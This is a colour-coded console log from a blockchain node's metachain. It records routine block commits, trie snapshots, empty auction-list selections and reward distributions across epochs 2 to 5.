[0;32mINFO [0m[2026-10-06 22:07:04.200] [process/block]      [metachain/2/51/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 9a4af4e50bfcd50eca58a91c2d292729269aa01b4271e629928948e96d46c52a 
[0;32mINFO [0m[2026-10-06 22:07:04.206] [state]              [metachain/2/51/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = c014cc26b50d951bcb4181b792bf392b66e1b31a3a8e423ba3e44b25b86c4c2e [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:04.209] [state]              [metachain/2/51/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 5cde8492bd57c188e068455609c8b4c532ed63f49c4bd7f0312e2668238f4497 [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:09.019] [process/block]      [metachain/2/52/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 1e04022185adb523d523b8997926764612b46cfbc616e0ed119c4033af1e2209 
[0;32mINFO [0m[2026-10-06 22:07:15.025] [process/block]      [metachain/2/53/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 027e60845e3e39ecda89d26e67bd3f5fd3d72adc76fad6cd4411dc19cea24d37 
[0;32mINFO [0m[2026-10-06 22:07:21.025] [process/block]      [metachain/2/54/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = ba6202b9f7f37dbc08dd40d112673a7d7c2a2e045f0930a827b37645bd622e1c 
[0;32mINFO [0m[2026-10-06 22:07:27.024] [process/block]      [metachain/2/55/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = abe9d1b503d6baec04e5c5262722c3b5fed72cd4ac5b986dfd06df9aac721106 
[0;32mINFO [0m[2026-10-06 22:07:33.022] [process/block]      [metachain/2/56/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = a3b58fd181840f17790fe70f8e498c54d3305a95627fac48b0fffaf09bf077cc 
[0;32mINFO [0m[2026-10-06 22:07:39.020] [process/block]      [metachain/2/57/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = f8306f4e7ca39bb9b6f13d11a744d378704247606a11c96535a801479e2727cd 
[0;32mINFO [0m[2026-10-06 22:07:45.023] [process/block]      [metachain/2/58/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = 916c97f31d40ce2d78f3f17075160ad02a226e25014b1c4ffaf3abbf411753ae 
[0;32mINFO [0m[2026-10-06 22:07:51.019] [process/block]      [metachain/2/59/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = d5925204a26c786a62e96cbd2910ac734e0cd847184912cdac40e06e218b155f 
[0;32mINFO [0m[2026-10-06 22:07:57.022] [process/block]      [metachain/2/60/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 4ec5140161c5ccae6d507183cef503c55b6b92e013c2034cde4cbcb132d0b79d 
[0;32mINFO [0m[2026-10-06 22:08:03.018] [process/block]      [metachain/2/61/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = e54920a5fea78d8f95da4a974d65c4139b13a4634f41f9049e5fa9e6516d95e4 
[0;32mINFO [0m[2026-10-06 22:08:09.020] [process/block]      [metachain/2/62/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 869a687a3d788554043e7561420a9766034c890e53ab06788aebf3f21b1019ae 
[0;32mINFO [0m[2026-10-06 22:08:15.017] [process/block]      [metachain/2/63/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 817f72636dc9532dfcad857df0cdc1f663b1493e541efcf6fdbf92976bba8514 
[0;32mINFO [0m[2026-10-06 22:08:21.026] [process/block]      [metachain/2/64/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = 9cfeba2bb15b62056c32a409f2088b2e36b791c0c52a9c01193334a0d8cd53b1 
[0;32mINFO [0m[2026-10-06 22:08:27.021] [process/block]      [metachain/2/65/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = 27c5c3abf399f6e01998177b295439476172ba70b695e10dcd0fa31138fd6336 
[0;32mINFO [0m[2026-10-06 22:08:33.023] [process/block]      [metachain/2/66/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = 54e163f5a4f7dbd0ed8c2837b9cd668624b822e00f825dfbd42424c7c766c3a5 
[0;32mINFO [0m[2026-10-06 22:08:39.019] [process/block]      [metachain/2/67/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = 9a19563a22e87834d81dc6b2ee4b45044199830ad5804639cd687ea70681ffb6 
[0;32mINFO [0m[2026-10-06 22:08:45.023] [process/block]      [metachain/2/68/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = ddbc29f2adabdfd6fe96fe42cd5a01529e55bd5e043735245b12e22cb5a9c808 
[0;32mINFO [0m[2026-10-06 22:08:51.019] [process/block]      [metachain/2/69/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = 2f512e3d63fd05cfa6dc578b521453c85f19a5c9b0a7f89bf87b68ccc59b14dd 
[0;32mINFO [0m[2026-10-06 22:08:57.020] [process/block]      [metachain/2/70/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = c592b1e3e3440b5c9502c84cccb95b6b7bd5ab301929f4a6d97acc59fe5387c3 
[0;32mINFO [0m[2026-10-06 22:09:03.020] [process/block]      [metachain/2/71/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = c186d35b85bd82fd2cc17ac72ab2926e0a573d0356042ac0ccc2d76e5ec1af6c 
[0;32mINFO [0m[2026-10-06 22:09:09.020] [process/block]      [metachain/2/72/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 6d2355165a7f16836aa80d1fc97d9b5d9e84251a60880f0bc5e583a964af65ce 
[0;32mINFO [0m[2026-10-06 22:09:15.023] [process/block]      [metachain/2/73/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = a9a52ed8100e41548bf4ef0497a16713142d124cc9537f4c879c47cffb6a9671 
[0;32mINFO [0m[2026-10-06 22:09:21.011] [processProxy]       [metachain/2/74/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:21.013] [..hStart/metachain] [metachain/3/74/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:09:21.013] [..hStart/metachain] [metachain/3/74/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3668827386355432167 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:09:22.101] [process/block]      [metachain/3/74/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = 39df0bf736a8cda05c31cf223144dabcc93d5e11f37778f35fbc9126b60b4c40 
[0;32mINFO [0m[2026-10-06 22:09:22.109] [state]              [metachain/3/74/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:22.116] [state]              [metachain/3/74/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = dc15a69e39a4580ddb14fc9cb0f5ceb786982ca4836e357b660d8b659397b044 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:27.023] [process/block]      [metachain/3/75/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e3c107f41ec0a2f53b46b9d6f7e576208ef14e43103630e96972252380c2f71c 
[0;32mINFO [0m[2026-10-06 22:09:33.029] [process/block]      [metachain/3/76/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 6b0e17cff9a368cdae50ea723705a7de3b69e5439f6745a2d69f495a3f5f9858 
[0;32mINFO [0m[2026-10-06 22:09:39.022] [process/block]      [metachain/3/77/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = aa5b121789805feb934081b4748c55878ecb7da11ade44d5656651ebfe07fb76 
[0;32mINFO [0m[2026-10-06 22:09:45.023] [process/block]      [metachain/3/78/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = 490e9572193c7f37ccc66004354116ad8bf137c965d763464564aae2ea40b93e 
[0;32mINFO [0m[2026-10-06 22:09:51.025] [process/block]      [metachain/3/79/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = e47c079155827e3177fb75338da1710765c08c7a6252982a429641a736b2a59f 
[0;32mINFO [0m[2026-10-06 22:09:57.019] [process/block]      [metachain/3/80/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = 116da5e8cb72c52359b5854b6328032622266ff981727e65af6fee5f677ca837 
[0;32mINFO [0m[2026-10-06 22:10:03.018] [process/block]      [metachain/3/81/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = c9a82c6aae1bb6bd40fab1b61876b3780ee282539195024f1e157711330e4771 
[0;32mINFO [0m[2026-10-06 22:10:09.025] [process/block]      [metachain/3/82/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 71824848c29f7d689abb45869019d92bb8fdca375b578796680b18260eec1051 
[0;32mINFO [0m[2026-10-06 22:10:15.018] [process/block]      [metachain/3/83/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 342d9189b38db4fa8c3b6e5f78a9f070ca898514ad3b6c94d09d116078f13731 
[0;32mINFO [0m[2026-10-06 22:10:21.023] [process/block]      [metachain/3/84/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 15289ba5c07e3344c8276148f84eb70ebd402213af4bf5b728272d75a3c94ca1 
[0;32mINFO [0m[2026-10-06 22:10:27.018] [process/block]      [metachain/3/85/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = d39921e2eece0151621b0b05eca40de5d5a234ced526d0b207e3f16ac41c636b 
[0;32mINFO [0m[2026-10-06 22:10:33.018] [process/block]      [metachain/3/86/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 20bb9fe170d1ce992230320dc0c2702e14c1f0801fb45f84c01cace83e9c8072 
[0;32mINFO [0m[2026-10-06 22:10:39.020] [process/block]      [metachain/3/87/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 394aa6b6b3fc0eba2c7be1ba47d98a0a808794db4e3d1d5ba0a794ce1fc0c460 
[0;32mINFO [0m[2026-10-06 22:10:45.022] [process/block]      [metachain/3/88/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 1590f2145e6ff1bf08927d345a96d77ce3a0c00e4675c58cf45edf1a8ebb0fa0 
[0;32mINFO [0m[2026-10-06 22:10:51.036] [process/block]      [metachain/3/89/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 18f93ff1e44b76827682ae5d2ab2c5eb9d392005b489a45181d11b2d71587e4f 
[0;32mINFO [0m[2026-10-06 22:10:57.018] [process/block]      [metachain/3/90/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 54d5a7268d8c5a9cff83d17e7f28af1f66116cec3164efab5a5e6bc113d5bfb9 
[0;32mINFO [0m[2026-10-06 22:11:03.018] [process/block]      [metachain/3/91/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = e2a395548744a21d55c3348e50b0970c05eab935084a84808420a12a65ba29bf 
[0;32mINFO [0m[2026-10-06 22:11:09.020] [process/block]      [metachain/3/92/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = b9000723b780dcbdd3303c02169aaf9a6a67a061e54181c0fbea421533904eea 
[0;32mINFO [0m[2026-10-06 22:11:15.023] [process/block]      [metachain/3/93/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = a047994d2bd288e73d64cf967a2c8aa81c5cbea9bc69267c8f2a5ae4b805ddca 
[0;32mINFO [0m[2026-10-06 22:11:21.022] [process/block]      [metachain/3/94/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = e593dafa4bbd3ce51d9762a9a3d2ad8c24b0bde274bef1dbfa2b2dea501e2d7b 
[0;32mINFO [0m[2026-10-06 22:11:27.019] [process/block]      [metachain/3/95/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = aa20ba0402ce43e10fb77851d5db12e246efc6a429f596d489adc249f29161dc 
[0;32mINFO [0m[2026-10-06 22:11:33.021] [process/block]      [metachain/3/96/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = c45ed6389c88e2d2c18a964feb33e87855e34274f298d1263cb249c486bdeeef 
[0;32mINFO [0m[2026-10-06 22:11:39.013] [processProxy]       [metachain/3/97/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:39.014] [..hStart/metachain] [metachain/4/97/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:11:39.014] [..hStart/metachain] [metachain/4/97/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3673434658148159309 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:11:40.213] [process/block]      [metachain/4/97/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = d97d6366ddaf6c951512b1ed0307e1b11a5b6014a740f879d3804379517df773 
[0;32mINFO [0m[2026-10-06 22:11:40.216] [state]              [metachain/4/97/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:40.216] [state]              [metachain/4/97/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 1d8f0eaef835a1b4ce126bb997b2e3493fc1839419674119d2fd5f4656c82ca9 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:45.024] [process/block]      [metachain/4/98/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 51ac71436f4951c2f5ab6593b92534367dde96f2127ff9b0bc064d91bb8b93bd 
[0;32mINFO [0m[2026-10-06 22:11:51.022] [process/block]      [metachain/4/99/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 3bf36fa4535e682b5022fc065ba0c03528efc937806cc2b36bac8b0b0b12ab41 
[0;32mINFO [0m[2026-10-06 22:11:57.025] [process/block]      [metachain/4/100/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 3d1385849c2a9a57acca75f86c065ce300b95ea89c80ed347de0733b2c51dfef 
[0;32mINFO [0m[2026-10-06 22:12:03.020] [process/block]      [metachain/4/101/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 14b48d871da346dca320aca2b8ec24f55715c8d129f354161252ab0709851270 
[0;32mINFO [0m[2026-10-06 22:12:09.027] [process/block]      [metachain/4/102/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = f2a64ad009da321b4597927157a9d44495a4f838fd2a9743def0a43332197d3d 
[0;32mINFO [0m[2026-10-06 22:12:15.026] [process/block]      [metachain/4/103/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 0a0aebc38ddb7774fa83becf49d66b815e2b7373a53e896cf4ac6178e4ff88c1 
[0;32mINFO [0m[2026-10-06 22:12:21.035] [process/block]      [metachain/4/104/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 93909d5419c830ea178befcff0ab7d46b4fc349d6f77f77eb03fb90738ba82b9 
[0;32mINFO [0m[2026-10-06 22:12:27.024] [process/block]      [metachain/4/105/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = aef22663c6cf3c9081285f817494ca508f632ed5c19a7e51507ef0f64013ab73 
[0;32mINFO [0m[2026-10-06 22:12:33.021] [process/block]      [metachain/4/106/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 50c9479a796694f65a265beb23fdf69759624225e6875979fa249961b72b3a92 
[0;32mINFO [0m[2026-10-06 22:12:39.021] [process/block]      [metachain/4/107/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = c7e85839a7854379c8234929d109950287e12724968ddab064f951f420ff4893 
[0;32mINFO [0m[2026-10-06 22:12:45.020] [process/block]      [metachain/4/108/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = 6880f6f148acbdc2fd846db3852e42f14afc7c6f560896a88c760bcb1bf787c2 
[0;32mINFO [0m[2026-10-06 22:12:51.029] [process/block]      [metachain/4/109/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 36ea4d7674a364705426dc3a7304eadf0fe29b06b3e98b52e5361acd997600c7 
[0;32mINFO [0m[2026-10-06 22:12:57.021] [process/block]      [metachain/4/110/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 2ed5262f4ab4498a964ff5f7b5d6d6be4bc369840f0c729dafa154145f0e2f1a 
[0;32mINFO [0m[2026-10-06 22:13:03.011] [process/block]      [metachain/4/111/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 6832733afbc8e6de0e79fb3e16c6f5cf1aad4e639528fab7826ea013fa6b3e4e 
[0;32mINFO [0m[2026-10-06 22:13:09.020] [process/block]      [metachain/4/112/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = e0d3b72262176067e4822686de342efed36dd30f491bdcfce4f07d107a93e843 
[0;32mINFO [0m[2026-10-06 22:13:15.022] [process/block]      [metachain/4/113/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = db6e4f1e9a4b4d3db329d583af2b7f7a5f9a052ca06ebf345fdefb3b9789896f 
[0;32mINFO [0m[2026-10-06 22:13:21.021] [process/block]      [metachain/4/114/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 82e77406b72b27c2514141fbfcdfd4d43d1e33ee38ac0533ef7015f7ef9bf223 
[0;32mINFO [0m[2026-10-06 22:13:27.026] [process/block]      [metachain/4/115/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = d1ba42428579d479e4e65f6dbd77fcd2840b7845b85396058382b4282e29b7cf 
[0;32mINFO [0m[2026-10-06 22:13:33.019] [process/block]      [metachain/4/116/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 93b69b44b56f4b4b81c12155dc355cb73f4da181cc015d047d2e0ba5abcae7b5 
[0;32mINFO [0m[2026-10-06 22:13:39.025] [process/block]      [metachain/4/117/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 7412c0e7252b5856bec2c5963efec2e5fe7309b96408c6594f64ac4ff4ccd4a1 
[0;32mINFO [0m[2026-10-06 22:13:45.020] [process/block]      [metachain/4/118/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = aae8b740f6a9fb07dd76e731ed5ac8adaa7d4f4bf7c0c9055d068bcd839fe36a 
[0;32mINFO [0m[2026-10-06 22:13:51.025] [process/block]      [metachain/4/119/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 742ded8bdae4b18a0cadb4565c4e421856f511315668fb608c543c62601ac10c 
[0;32mINFO [0m[2026-10-06 22:13:57.017] [processProxy]       [metachain/4/120/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:13:57.019] [..hStart/metachain] [metachain/5/120/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:13:57.019] [..hStart/metachain] [metachain/5/120/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3673436007558740681 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:13:58.339] [process/block]      [metachain/5/120/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = a5965962f0001392e147070206b09c5d5ceb0f7fc7e11abf511dac847eafe513 
[0;32mINFO [0m[2026-10-06 22:13:58.339] [state]              [metachain/5/120/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:13:58.339] [state]              [metachain/5/120/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 2c700ea96509eca5f766dc45911b057b5a1ab9e8c4e0d17494223dbd9549cef1 [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:03.024] [process/block]      [metachain/5/121/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = 9ab35b5f657875a10a852a707e911f69173d8b5ae7de205dbc137a20c9d7268e 
[0;32mINFO [0m[2026-10-06 22:14:09.019] [process/block]      [metachain/5/122/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = 50f910007d7b06bc13fdde42d1dc3c59046301a356e378b6080dd2cea4c2c335 
[0;32mINFO [0m[2026-10-06 22:14:15.026] [process/block]      [metachain/5/123/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 05dcb220f804060b49fa989246f135edc961b5fcf16c5bb6b7982c46f6655588 
